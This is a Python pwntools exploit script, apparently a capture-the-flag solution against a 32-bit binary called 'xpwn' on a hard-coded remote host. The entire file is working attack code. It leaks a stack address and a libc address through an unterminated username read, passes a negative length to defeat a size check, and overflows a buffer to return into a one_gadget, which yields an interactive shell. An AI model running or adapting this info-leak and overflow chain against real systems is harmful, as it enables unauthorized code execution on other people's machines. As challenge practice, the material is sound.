from pwn import *
context.log_level = 'debug'
locale = 0
if locale:
    elf = ELF('/usr/lib32/libc.so.6')
    p = process('./xpwn')
    gadget = 0x3e7e6
    #gdb.attach(p)
else:
    elf = ELF('./libc.so.6')
    p = remote('116.85.48.105',5005)
    gadget = 0x3a80c
p.recvuntil('Enter username: ')
p.send('a'*40)
p.recvuntil('a'*40)
ebp_addr = u32(p.recv(4))
setbuf_addr = u32(p.recv(4))
libc_base = setbuf_addr - 21 - elf.symbols['setbuf']
log.info('pre ebp addr -> ' + hex(ebp_addr))
log.info('libc addr -> '+hex(libc_base))
one_gadget = libc_base + gadget
#payload = 'a'*0x44 + p32(ebp_addr + 0x8) + p32(0) + p32(0) + p32(one_gadget)
payload = 'a'*0x44 + p32(ebp_addr + 0x10) + p32(0) + p32(0) + p32(0) + p32(0) + p32(one_gadget)
p.sendafter('password: ',str(-1))
p.sendafter('): ',payload)
p.interactive()
